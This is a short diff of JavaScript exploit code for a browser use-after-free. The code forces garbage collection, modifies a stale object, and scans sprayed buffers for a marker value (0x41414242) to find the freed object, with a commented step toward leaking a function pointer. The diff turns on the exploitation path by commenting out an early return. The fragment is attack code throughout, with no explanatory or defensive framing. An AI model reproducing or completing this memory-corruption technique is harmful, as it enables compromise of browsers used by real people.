@@ -160,7 +160,7 @@ function go_() {
 	alert("before gc");
 	dgc();
 	alert("after gc");
-	return;
+	//return;
 	
 	stale[0] += 0x101;
 
@@ -175,7 +175,7 @@ function go_() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
-				//alert("Found the object!!");
+				alert("Found the object!!");
 
 				// Leak function pointer
 				//stale[0] = fc;
